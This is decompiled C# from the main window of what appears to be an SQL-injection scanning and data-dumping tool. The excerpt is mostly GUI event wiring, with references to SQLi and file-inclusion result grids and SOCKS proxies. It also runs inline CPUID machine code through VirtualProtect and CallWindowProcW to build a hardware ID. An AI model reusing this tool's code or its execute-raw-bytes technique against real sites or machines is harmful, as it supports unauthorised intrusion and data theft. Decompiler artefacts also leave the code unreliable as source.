	// Token: 0x170004CD RID: 1229
	// (get) Token: 0x06000E5F RID: 3679 RVA: 0x00007E42 File Offset: 0x00006042
	// (set) Token: 0x06000E60 RID: 3680 RVA: 0x00007E4A File Offset: 0x0000604A
	internal virtual DataGridViewImageColumn DataGridViewImageColumn1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004CE RID: 1230
	// (get) Token: 0x06000E61 RID: 3681 RVA: 0x00007E53 File Offset: 0x00006053
	// (set) Token: 0x06000E62 RID: 3682 RVA: 0x00007E5B File Offset: 0x0000605B
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004CF RID: 1231
	// (get) Token: 0x06000E63 RID: 3683 RVA: 0x00007E64 File Offset: 0x00006064
	// (set) Token: 0x06000E64 RID: 3684 RVA: 0x00007E6C File Offset: 0x0000606C
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004D0 RID: 1232
	// (get) Token: 0x06000E65 RID: 3685 RVA: 0x00007E75 File Offset: 0x00006075
	// (set) Token: 0x06000E66 RID: 3686 RVA: 0x00007E7D File Offset: 0x0000607D
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004D1 RID: 1233
	// (get) Token: 0x06000E67 RID: 3687 RVA: 0x00007E86 File Offset: 0x00006086
	// (set) Token: 0x06000E68 RID: 3688 RVA: 0x00007E8E File Offset: 0x0000608E
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004D2 RID: 1234
	// (get) Token: 0x06000E69 RID: 3689 RVA: 0x00007E97 File Offset: 0x00006097
	// (set) Token: 0x06000E6A RID: 3690 RVA: 0x00007E9F File Offset: 0x0000609F
	internal virtual DataGridViewTextBoxColumn Column18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004D3 RID: 1235
	// (get) Token: 0x06000E6B RID: 3691 RVA: 0x00007EA8 File Offset: 0x000060A8
	// (set) Token: 0x06000E6C RID: 3692 RVA: 0x00007EB0 File Offset: 0x000060B0
	internal virtual DataGridViewImageColumn DataGridViewImageColumn2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004D4 RID: 1236
	// (get) Token: 0x06000E6D RID: 3693 RVA: 0x00007EB9 File Offset: 0x000060B9
	// (set) Token: 0x06000E6E RID: 3694 RVA: 0x00007EC1 File Offset: 0x000060C1
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004D5 RID: 1237
	// (get) Token: 0x06000E6F RID: 3695 RVA: 0x00007ECA File Offset: 0x000060CA
	// (set) Token: 0x06000E70 RID: 3696 RVA: 0x00007ED2 File Offset: 0x000060D2
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004D6 RID: 1238
	// (get) Token: 0x06000E71 RID: 3697 RVA: 0x00007EDB File Offset: 0x000060DB
	// (set) Token: 0x06000E72 RID: 3698 RVA: 0x00007EE3 File Offset: 0x000060E3
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004D7 RID: 1239
	// (get) Token: 0x06000E73 RID: 3699 RVA: 0x00007EEC File Offset: 0x000060EC
	// (set) Token: 0x06000E74 RID: 3700 RVA: 0x00007EF4 File Offset: 0x000060F4
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004D8 RID: 1240
	// (get) Token: 0x06000E75 RID: 3701 RVA: 0x00007EFD File Offset: 0x000060FD
	// (set) Token: 0x06000E76 RID: 3702 RVA: 0x00007F05 File Offset: 0x00006105
	internal virtual DataGridViewTextBoxColumn Column17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004D9 RID: 1241
	// (get) Token: 0x06000E77 RID: 3703 RVA: 0x00007F0E File Offset: 0x0000610E
	// (set) Token: 0x06000E78 RID: 3704 RVA: 0x00007F16 File Offset: 0x00006116
	internal virtual DataGridViewImageColumn Column6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004DA RID: 1242
	// (get) Token: 0x06000E79 RID: 3705 RVA: 0x00007F1F File Offset: 0x0000611F
	// (set) Token: 0x06000E7A RID: 3706 RVA: 0x00007F27 File Offset: 0x00006127
	internal virtual DataGridViewTextBoxColumn Column7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004DB RID: 1243
	// (get) Token: 0x06000E7B RID: 3707 RVA: 0x00007F30 File Offset: 0x00006130
	// (set) Token: 0x06000E7C RID: 3708 RVA: 0x00007F38 File Offset: 0x00006138
	internal virtual DataGridViewTextBoxColumn Column8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004DC RID: 1244
	// (get) Token: 0x06000E7D RID: 3709 RVA: 0x00007F41 File Offset: 0x00006141
	// (set) Token: 0x06000E7E RID: 3710 RVA: 0x00007F49 File Offset: 0x00006149
	internal virtual DataGridViewTextBoxColumn Column9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004DD RID: 1245
	// (get) Token: 0x06000E7F RID: 3711 RVA: 0x00007F52 File Offset: 0x00006152
	// (set) Token: 0x06000E80 RID: 3712 RVA: 0x00007F5A File Offset: 0x0000615A
	internal virtual DataGridViewTextBoxColumn Column10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004DE RID: 1246
	// (get) Token: 0x06000E81 RID: 3713 RVA: 0x00007F63 File Offset: 0x00006163
	// (set) Token: 0x06000E82 RID: 3714 RVA: 0x00007F6B File Offset: 0x0000616B
	internal virtual DataGridViewTextBoxColumn Column11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004DF RID: 1247
	// (get) Token: 0x06000E83 RID: 3715 RVA: 0x00007F74 File Offset: 0x00006174
	// (set) Token: 0x06000E84 RID: 3716 RVA: 0x00007F7C File Offset: 0x0000617C
	internal virtual DataGridViewTextBoxColumn Column12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004E0 RID: 1248
	// (get) Token: 0x06000E85 RID: 3717 RVA: 0x00007F85 File Offset: 0x00006185
	// (set) Token: 0x06000E86 RID: 3718 RVA: 0x00007F8D File Offset: 0x0000618D
	internal virtual DataGridViewTextBoxColumn Column13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004E1 RID: 1249
	// (get) Token: 0x06000E87 RID: 3719 RVA: 0x00007F96 File Offset: 0x00006196
	// (set) Token: 0x06000E88 RID: 3720 RVA: 0x00007F9E File Offset: 0x0000619E
	internal virtual DataGridViewTextBoxColumn Column16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004E2 RID: 1250
	// (get) Token: 0x06000E89 RID: 3721 RVA: 0x00007FA7 File Offset: 0x000061A7
	// (set) Token: 0x06000E8A RID: 3722 RVA: 0x00058D74 File Offset: 0x00056F74
	internal virtual ToolStripStatusLabel lblIP
	{
		[CompilerGenerated]
		get
		{
			return this._lblIP;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_89);
			ToolStripStatusLabel lblIP = this._lblIP;
			if (lblIP != null)
			{
				lblIP.DoubleClick -= value2;
			}
			this._lblIP = value;
			lblIP = this._lblIP;
			if (lblIP != null)
			{
				lblIP.DoubleClick += value2;
			}
		}
	}

	// Token: 0x06000E8B RID: 3723 RVA: 0x000027EC File Offset: 0x000009EC
	private void method_0()
	{
	}

	// Token: 0x170004E3 RID: 1251
	// (get) Token: 0x06000E8C RID: 3724 RVA: 0x00007FAF File Offset: 0x000061AF
	// (set) Token: 0x06000E8D RID: 3725 RVA: 0x00007FB6 File Offset: 0x000061B6
	public static string dataAvailable { get; set; }

	// Token: 0x170004E4 RID: 1252
	// (get) Token: 0x06000E8E RID: 3726 RVA: 0x00007FBE File Offset: 0x000061BE
	// (set) Token: 0x06000E8F RID: 3727 RVA: 0x00007FC5 File Offset: 0x000061C5
	public static string dataReady { get; set; }

	// Token: 0x06000E90 RID: 3728 RVA: 0x00058DB8 File Offset: 0x00056FB8
	public void smethod_0()
	{
		this.dictionary_1 = new Dictionary<string, Delegate>();
		this.dictionary_1.Add("MainForm", new EventHandler(this.smethod_5));
		this.dictionary_1.Add("btnStart", new EventHandler(this.method_10));
		this.dictionary_1.Add("btnStop", new EventHandler(this.method_11));
		this.dictionary_1.Add("btnSearchColumnStart", new EventHandler(this.method_12));
		this.dictionary_1.Add("btnSearchColumnStop", new EventHandler(this.method_13));
		this.dictionary_1.Add("twMain", new TreeViewEventHandler(this.smethod_6));
		this.dictionary_1.Add("BackgroundWorker", new DoWorkEventHandler(this.method_26));
	}

	// Token: 0x06000E91 RID: 3729 RVA: 0x00058E94 File Offset: 0x00057094
	public void smethod_1()
	{
		try
		{
			foreach (KeyValuePair<string, Delegate> keyValuePair in this.dictionary_1)
			{
				string key = keyValuePair.Key;
				object objectValue = RuntimeHelpers.GetObjectValue(this.FindControl(key));
				bool flag;
				if ((flag = true) == objectValue is Button)
				{
					((Button)objectValue).Click += (EventHandler)keyValuePair.Value;
				}
				else if (flag == objectValue is ToolStripButton)
				{
					((ToolStripButton)objectValue).Click += (EventHandler)keyValuePair.Value;
				}
				else if (flag == objectValue is TreeViewExt)
				{
					this.twMain.AfterSelect += (TreeViewEventHandler)keyValuePair.Value;
				}
				else if (flag == (objectValue == null))
				{
					string left = key;
					if (Operators.CompareString(left, "MainForm", false) == 0)
					{
						base.Load += (EventHandler)keyValuePair.Value;
					}
					else if (Operators.CompareString(left, "BackgroundWorker", false) == 0)
					{
						this.bcWorker.DoWork += (DoWorkEventHandler)keyValuePair.Value;
					}
				}
			}
		}
		finally
		{
			Dictionary<string, Delegate>.Enumerator enumerator;
			((IDisposable)enumerator).Dispose();
		}
	}

	// Token: 0x06000E92 RID: 3730 RVA: 0x00058FE4 File Offset: 0x000571E4
	protected virtual object FindControl(string Name)
	{
		PropertyInfo property = base.GetType().GetProperty(Name, BindingFlags.IgnoreCase | BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
		object result;
		if (property != null)
		{
			object objectValue = RuntimeHelpers.GetObjectValue(property.GetValue(this, null));
			result = objectValue;
		}
		else
		{
			result = null;
		}
		return result;
	}

	// Token: 0x06000E93 RID: 3731 RVA: 0x0005901C File Offset: 0x0005721C
	public static string smethod_7()
	{
		return MainForm.smethod_7(65);
	}

	// Token: 0x06000E94 RID: 3732 RVA: 0x00059034 File Offset: 0x00057234
	public static string smethod_7(int index)
	{
		return "sqyfJVf/DH1Z7BDrokWvHg==1vP9F+2Oks0J9/MiBEu+lA==uclng";
	}

	// Token: 0x06000E95 RID: 3733
	[DllImport("user32", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr CallWindowProcW([In] byte[] byte_0, IntPtr intptr_0, int int_14, [In] [Out] byte[] byte_1, IntPtr intptr_1);

	// Token: 0x06000E96 RID: 3734
	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool VirtualProtect([In] byte[] byte_0, IntPtr intptr_0, int int_14, ref int int_15);

	// Token: 0x06000E97 RID: 3735 RVA: 0x00059048 File Offset: 0x00057248
	public void smethod_9()
	{
		byte[] array = new byte[8];
		RuntimeHelpers.InitializeArray(new byte[26], fieldof(Class55.struct12_0).FieldHandle);
		byte[] array2 = new byte[]
		{
			83,
			72,
			199,
			192,
			1,
			0,
			0,
			0,
			15,
			162,
			65,
			137,
			0,
			65,
			137,
			80,
			4,
			91,
			195
		};
		byte[] array3 = array2;
		IntPtr intPtr = new IntPtr(array3.Length);
		int num;
		if (MainForm.VirtualProtect(array3, intPtr, 64, ref num))
		{
		}
		intPtr = new IntPtr(array.Length);
		checked
		{
			string text;
			if (!(MainForm.CallWindowProcW(array3, IntPtr.Zero, 0, array, intPtr) == IntPtr.Zero))
			{
				text = "X7";
				text = BitConverter.ToUInt32(array, 4).ToString("X8") + BitConverter.ToUInt32(array, 0).ToString("X8") + text;
				num = 0;
				System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
				string text2 = "abc1defg2hi3jk4lm5no6pq7rs8tuv9wx0yz".ToUpper();
				int num2 = text2.Length - 1;
				foreach (char @string in text.ToCharArray())
				{
					int num3 = (int)Math.Round((double)Strings.Asc(@string) / 3.0);
					num3 = num3 * num % num2;
					stringBuilder.Append(text2[num3]);
					num++;
				}
				text = stringBuilder.ToString();
			}
			Versioned.CallByName(this, "dataAvailable", CallType.Set, new object[]
			{
				text
			});
		}
	}

	// Token: 0x06000E98 RID: 3736 RVA: 0x000591A4 File Offset: 0x000573A4
	internal void method_1(string string_5)
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new MainForm.Delegate44(this.method_1), new object[]
			{
				string_5
			});
		}
		else
		{
			this.string_4 = global::Globals.FormatStr(string_5);
			this.lblMainStatus.Text = string_5;
		}
	}

	// Token: 0x06000E99 RID: 3737 RVA: 0x000591F0 File Offset: 0x000573F0
	private void smethod_5(object sender, EventArgs e)
	{
		int num2;
		int num4;
		object obj;
		try
		{
			IL_02:
			int num = 1;
			base.SuspendLayout();
			IL_0A:
			num = 2;
			this.Text = global::Globals.APP_VERSION;
			IL_17:
			num = 3;
			base.Icon = Class6.icon;
			IL_24:
			num = 4;
			this.ntfTray.Text = this.Text;
			IL_37:
			num = 5;
			this.ntfTray.Icon = base.Icon;
			IL_4A:
			num = 6;
			Class2.Class3_0.Splash_0.SetLoading(global::Globals.translate_0.GetStr(this, 10, "Initializing.."));
			IL_6D:
			num = 7;
			if (File.Exists(global::Globals.XML_PATH))
			{
				goto IL_97;
			}
			IL_7E:
			num = 8;
			Class50.smethod_0();
			IL_85:
			num = 9;
			Class50.smethod_3(this, null);
			IL_8F:
			num = 10;
			Class50.smethod_1();
			IL_97:
			num = 12;
			global::Globals.G_SOCKS = new Class35();
			IL_A4:
			ProjectData.ClearProjectError();
			num2 = -2;
			IL_AC:
			num = 14;
			global::Globals.G_DataGP = new DataGP(new MemoryStream((byte[])Encoding.ASCII.GetBytes(Versioned.CallByName(global::Globals.GMain, "Tag", CallType.Get, new object[0])), true), null);
			IL_E6:
			num = 15;
			Versioned.CallByName(global::Globals.GMain, "Tag", CallType.Set, new object[1]);
			IL_100:
			ProjectData.ClearProjectError();
			num2 = 0;
			IL_107:
			num = 17;
			if (global::Globals.IS_DUMP_INSTANCE)
			{
				goto IL_122;
			}
			IL_114:
			num = 18;
			if (this.method_7())
			{
				goto IL_30C;
			}
			IL_122:
			num = 22;
			Versioned.CallByName(this, "smethod_8", CallType.Method, new object[0]);
			IL_138:
			num = 23;
			Class2.Class3_0.Splash_0.SetLoading(global::Globals.translate_0.GetStr(this, 11, "Loading Settings.."));
			IL_15C:
			num = 24;
			this.method_73();
			IL_165:
			num = 25;
			Class2.Class3_0.Splash_0.SetLoading(global::Globals.translate_0.GetStr(this, 12, "Loading GUI.."));
			IL_189:
			num = 26;
			this.method_60(false);
			IL_193:
			num = 27;
			if (!global::Globals.IS_DUMP_INSTANCE)
			{
				goto IL_1B3;
			}
			IL_19D:
			num = 28;
			this.DumperForm.tlsMenu.Visible = false;
			goto IL_1EF;
			IL_1B3:
			num = 30;
			this.method_59(true);
			IL_1BD:
			num = 31;
			this.method_58(true);
			IL_1C7:
			num = 32;
			this.method_64();
			IL_1D0:
			num = 33;
			global::Globals.GStatistics = new Class26();
			IL_1DD:
			num = 34;
			this.method_19();
			IL_1E6:
			num = 35;
			this.method_212();
			IL_1EF:
			num = 37;
			if (global::Globals.IS_DUMP_INSTANCE)
			{
				goto IL_235;
			}
			IL_1F9:
			num = 39;
			if (this.bool_3)
			{
				goto IL_235;
			}
			IL_204:
			num = 41;
			this.twMain.Focus();
			IL_213:
			num = 42;
			this.twMain.ExpandAll();
			IL_221:
			num = 43;
			this.twMain.SelectedNode = this.treeNode_0;
			IL_235:
			num = 46;
			base.Size = new Size(this.MinimumSize.Width, this.MinimumSize.Height);
			IL_25F:
			num = 47;
			this.bool_2 = true;
			IL_269:
			num = 48;
			this.method_123(null, null);
			IL_274:
			num = 49;
			if (this.bool_3)
			{
				goto IL_2A5;
			}
			IL_282:
			num = 50;
			this.twMain.SelectedNode = this.treeNode_0;
			IL_296:
			num = 51;
			this.twMain.Focus();
			IL_2A5:
			num = 53;
			this.method_88();
			IL_2AE:
			num = 54;
			Class2.Class3_0.Splash_0.Close();
			IL_2C0:
			num = 55;
			global::Globals.ReleaseMemory();
			IL_2C8:
			num = 56;
			this.method_17(global::Globals.translate_0.GetStr(this, 0, "") + " " + global::Globals.APP_VERSION);
			IL_2F1:
			num = 57;
			base.ResumeLayout();
			IL_2FA:
			num = 58;
			base.Show();
			IL_303:
			num = 59;
			this.method_0();
			IL_30C:
			goto IL_456;
			IL_311:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_40F:
			goto IL_44B;
			IL_411:
			num4 = num;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num2 > -2) ? num2 : 1);
			IL_429:;
		}
		catch when (endfilter(obj is Exception & num2 != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_411;
		}
		IL_44B:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_456:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000E9A RID: 3738 RVA: 0x00059678 File Offset: 0x00057878
	private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
	{
		int num;
		int num4;
		object obj;
		try
		{
			IL_02:
			ProjectData.ClearProjectError();
			num = -2;
			IL_0A:
			int num2 = 2;
			if (!this.bool_2)
			{
				goto IL_221;
			}
			IL_1A:
			num2 = 4;
			if (this.$STATIC$Main_FormClosing$20211C128375$IsCalled$Init == null)
			{
				Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.$STATIC$Main_FormClosing$20211C128375$IsCalled$Init, new StaticLocalInitFlag(), null);
			}
			bool flag = false;
			try
			{
				Monitor.Enter(this.$STATIC$Main_FormClosing$20211C128375$IsCalled$Init, ref flag);
				if (this.$STATIC$Main_FormClosing$20211C128375$IsCalled$Init.State == 0)
				{
					this.$STATIC$Main_FormClosing$20211C128375$IsCalled$Init.State = 2;
					this.$STATIC$Main_FormClosing$20211C128375$IsCalled = false;
				}
				else if (this.$STATIC$Main_FormClosing$20211C128375$IsCalled$Init.State == 2)
				{
					throw new IncompleteInitialization();
				}
			}
			finally
			{
				this.$STATIC$Main_FormClosing$20211C128375$IsCalled$Init.State = 1;
				if (flag)
				{
					Monitor.Exit(this.$STATIC$Main_FormClosing$20211C128375$IsCalled$Init);
				}
			}
			IL_98:
			num2 = 5;
			if (this.$STATIC$Main_FormClosing$20211C128375$IsCalled)
			{
				goto IL_221;
			}
			IL_A5:
			num2 = 8;
			this.$STATIC$Main_FormClosing$20211C128375$IsCalled = true;
			IL_AE:
			num2 = 10;
			if (this.enum6_0 == MainForm.Enum6.const_0 && !this.DumperForm.Boolean_0)
			{
				goto IL_146;
			}
			IL_C9:
			num2 = 11;
			lock (this)
			{
				using (new Class8(this))
				{
					if (MessageBox.Show(global::Globals.translate_0.GetStr(this, 1, ""), global::Globals.translate_0.GetStr(this, 2, ""), MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.No)
					{
						e.Cancel = true;
						goto IL_221;
					}
				}
			}
			IL_13C:
			num2 = 12;
			this.bool_2 = false;
			IL_146:
			num2 = 14;
			this.bool_2 = false;
			IL_150:
			num2 = 15;
			base.Hide();
			IL_159:
			num2 = 16;
			global::Globals.translate_0.Save();
			IL_166:
			num2 = 17;
			if (global::Globals.IS_DUMP_INSTANCE)
			{
				goto IL_199;
			}
			IL_173:
			num2 = 18;
			this.method_61(true);
			IL_17D:
			num2 = 19;
			this.method_62(true);
			IL_187:
			num2 = 20;
			this.method_68();
			IL_190:
			num2 = 21;
			this.method_65();
			IL_199:
			num2 = 23;
			this.method_63(false);
			IL_1A3:
			num2 = 24;
			if (global::Globals.GQueue.method_0() != null)
			{
				goto IL_1D0;
			}
			IL_1B5:
			num2 = 25;
			global::Globals.DG_SQLi = null;
			IL_1BE:
			num2 = 26;
			global::Globals.DG_SQLiNoInjectable = null;
			IL_1C7:
			num2 = 27;
			global::Globals.DG_FileInclusao = null;
			IL_1D0:
			num2 = 29;
			if (this.bool_0)
			{
				goto IL_201;
			}
			IL_1DE:
			num2 = 30;
			Class50.smethod_4(base.Name, "URL_List_Line", Conversions.ToString(1), null);
			IL_1F8:
			num2 = 31;
			this.method_72();
			IL_201:
			num2 = 33;
			Process.GetCurrentProcess().WaitForExit(1000);
			IL_214:
			num2 = 34;
			Process.GetCurrentProcess().Kill();
			IL_221:
			goto IL_30B;
			IL_226:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_2C2:
			goto IL_300;
			IL_2C4:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num > -2) ? num : 1);
			IL_2DD:;
		}
		catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_2C4;
		}
		IL_300:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_30B:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000E9B RID: 3739 RVA: 0x00059A00 File Offset: 0x00057C00
	private void method_2(object sender, FormClosingEventArgs e)
	{
		int num;
		int num4;
		object obj;
		try
		{
			IL_02:
			ProjectData.ClearProjectError();
			num = -2;
			IL_0A:
			int num2 = 2;
			if (!this.bool_2)
			{
				goto IL_148;
			}
			IL_1A:
			num2 = 4;
			if (this.enum6_0 == MainForm.Enum6.const_0 && !this.DumperForm.Boolean_0)
			{
				goto IL_AC;
			}
			IL_34:
			num2 = 5;
			object gmain = global::Globals.GMain;
			lock (gmain)
			{
				using (new Class8(global::Globals.GMain))
				{
					if (MessageBox.Show(global::Globals.translate_0.GetStr(this, 1, ""), global::Globals.translate_0.GetStr(this, 2, ""), MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.No)
					{
						e.Cancel = true;
						goto IL_148;
					}
				}
			}
			IL_AC:
			num2 = 7;
			if (global::Globals.GQueue.method_0() != null)
			{
				goto IL_D7;
			}
			IL_BD:
			num2 = 8;
			global::Globals.DG_SQLi = null;
			IL_C5:
			num2 = 9;
			global::Globals.DG_SQLiNoInjectable = null;
			IL_CE:
			num2 = 10;
			global::Globals.DG_FileInclusao = null;
			IL_D7:
			num2 = 12;
			base.Hide();
			IL_E0:
			num2 = 13;
			if (global::Globals.IS_DUMP_INSTANCE)
			{
				goto IL_120;
			}
			IL_ED:
			num2 = 14;
			this.method_69(null, null);
			IL_F8:
			num2 = 15;
			if (this.bool_0)
			{
				goto IL_120;
			}
			IL_106:
			num2 = 16;
			Class50.smethod_4(base.Name, "URL_List_Line", Conversions.ToString(1), null);
			IL_120:
			num2 = 19;
			Application.DoEvents();
			IL_128:
			num2 = 20;
			Process.GetCurrentProcess().WaitForExit(3000);
			IL_13B:
			num2 = 21;
			Process.GetCurrentProcess().Kill();
			IL_148:
			goto IL_1FE;
			IL_14D:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_1B5:
			goto IL_1F3;
			IL_1B7:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num > -2) ? num : 1);
			IL_1D0:;
		}
		catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_1B7;
		}
		IL_1F3:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_1FE:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000E9C RID: 3740 RVA: 0x00007FCD File Offset: 0x000061CD
	private void MainForm_Resize(object sender, EventArgs e)
	{
		if (base.WindowState == FormWindowState.Minimized & this.chkSysTray.Checked)
		{
			this.ntfTray.Visible = true;
			base.Hide();
		}
		else
		{
			this.ntfTray.Visible = false;
		}
	}

	// Token: 0x06000E9D RID: 3741 RVA: 0x00008006 File Offset: 0x00006206
	private void method_3()
	{
		this.method_72();
		this.DumperForm.method_74();
	}

	// Token: 0x06000E9E RID: 3742 RVA: 0x00059C60 File Offset: 0x00057E60
	private static void smethod_10(Form form_0, IntPtr intptr_0, int int_14)
	{
		checked
		{
			try
			{
				MainForm.Struct9 @struct = default(MainForm.Struct9);
				object obj = Marshal.PtrToStructure(intptr_0, typeof(MainForm.Struct9));
				@struct = ((obj != null) ? ((MainForm.Struct9)obj) : default(MainForm.Struct9));
				if (@struct.int_1 != 0 && @struct.int_0 != 0)
				{
					Rectangle rectangle = form_0.RectangleToScreen(form_0.ClientRectangle);
					rectangle.Width += SystemInformation.FrameBorderSize.Width - int_14;
					rectangle.Height += SystemInformation.FrameBorderSize.Height + SystemInformation.CaptionHeight;
					Rectangle workingArea = Screen.GetWorkingArea(form_0.ClientRectangle);
					if (@struct.int_0 >= workingArea.X - 10 && @struct.int_0 <= workingArea.X + 10)
					{
						@struct.int_0 = workingArea.X;
					}
					int num = Screen.GetBounds(Screen.PrimaryScreen.Bounds).Height - workingArea.Height;
					if ((@struct.int_1 >= -10 && workingArea.Y > 0 && @struct.int_1 <= num + 10) || (workingArea.Y <= 0 && @struct.int_1 <= 10))
					{
						if (num > 0)
						{
							@struct.int_1 = workingArea.Y;
						}
						else
						{
							@struct.int_1 = 0;
						}
					}
					if (@struct.int_0 + rectangle.Width <= workingArea.Right + 10 && @struct.int_0 + rectangle.Width >= workingArea.Right - 10)
					{
						@struct.int_0 = workingArea.Right - (rectangle.Width + SystemInformation.FrameBorderSize.Width);
					}
					if (@struct.int_1 + rectangle.Height <= workingArea.Bottom + 10 && @struct.int_1 + rectangle.Height >= workingArea.Bottom - 10)
					{
						@struct.int_1 = workingArea.Bottom - (rectangle.Height + SystemInformation.FrameBorderSize.Height);
					}
					Marshal.StructureToPtr<MainForm.Struct9>(@struct, intptr_0, true);
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06000E9F RID: 3743 RVA: 0x00008019 File Offset: 0x00006219
	private void method_4(object sender, EventArgs e)
	{
		if (base.WindowState == FormWindowState.Minimized)
		{
			base.Show();
			base.WindowState = FormWindowState.Normal;
			this.ntfTray.Visible = false;
		}
		else
		{
			base.Focus();
		}
	}

	// Token: 0x06000EA0 RID: 3744 RVA: 0x00059EC0 File Offset: 0x000580C0
	private void method_5(object sender, EventArgs e)
	{
		this.cmbGUIHotKey.Enabled = this.chkGUIHotKey.Checked;
		if (this.bool_2)
		{
			Form form = this;
			MainForm.Class48.smethod_1(ref form);
			if (this.cmbGUIHotKey.Enabled)
			{
				form = this;
				MainForm.Class48.smethod_0(ref form, this.cmbGUIHotKey.Text.ToLower(), MainForm.Class48.Enum7.const_1);
			}
		}
	}

	// Token: 0x06000EA1 RID: 3745 RVA: 0x00008048 File Offset: 0x00006248
	private void method_6(object sender, EventArgs e)
	{
		if (this.bool_2)
		{
			this.method_5(null, null);
		}
	}

	// Token: 0x06000EA2 RID: 3746 RVA: 0x00059F1C File Offset: 0x0005811C
	protected override void WndProc(ref Message m)
	{
		int num;
		int num4;
		object obj;
		try
		{
			IL_02:
			ProjectData.ClearProjectError();
			num = -2;
			IL_0A:
			int num2 = 2;
			int msg = m.Msg;
			if (msg != 70)
			{
				if (msg != 786)
				{
					goto IL_40;
				}
				IL_22:
				num2 = 6;
				MainForm.Class48.smethod_2(m.WParam);
				goto IL_40;
			}
			IL_31:
			num2 = 4;
			MainForm.smethod_10(this, m.LParam, 0);
			IL_40:
			num2 = 8;
			base.WndProc(ref m);
			IL_49:
			goto IL_C4;
			IL_4B:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_7D:
			goto IL_B9;
			IL_7F:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num > -2) ? num : 1);
			IL_97:;
		}
		catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_7F;
		}
		IL_B9:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_C4:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000EA3 RID: 3747
	[DllImport("user32.dll")]
	private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_0, long long_0, [MarshalAs(UnmanagedType.LPStr)] System.Text.StringBuilder stringBuilder_0);

	// Token: 0x06000EA4 RID: 3748
	[DllImport("user32.dll")]
	private static extern bool SetForegroundWindow(IntPtr intptr_0);

	// Token: 0x06000EA5 RID: 3749
	[DllImport("user32.dll")]
	private static extern bool ShowWindowAsync(IntPtr intptr_0, int int_14);

